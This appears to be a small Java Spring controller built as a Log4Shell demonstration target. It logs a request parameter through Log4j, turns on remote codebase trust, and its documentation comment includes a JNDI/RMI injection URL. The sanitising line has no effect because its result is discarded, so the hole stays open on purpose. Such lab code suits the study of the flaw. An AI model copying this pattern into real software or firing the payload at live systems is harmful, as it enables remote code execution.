package com.adun.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * @author Zhu Dunfeng
 * @date 2021/12/14 11:34
 */
@RestController
public class JNDIController {
    private static final Logger logger = LogManager.getLogger(JNDIController.class);

    /**
     * http://127.0.0.1:8080/jndi?name=$%7Bjndi:rmi://127.0.0.1:1099/obj%7D
     * @param name
     * @return
     */
    @RequestMapping(path = "/jndi", method = RequestMethod.GET)
    public String jndiCode(@RequestParam("name") String name) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        name.replace("$", "---");
        logger.info(name);
        return "name:" + name;
    }


}
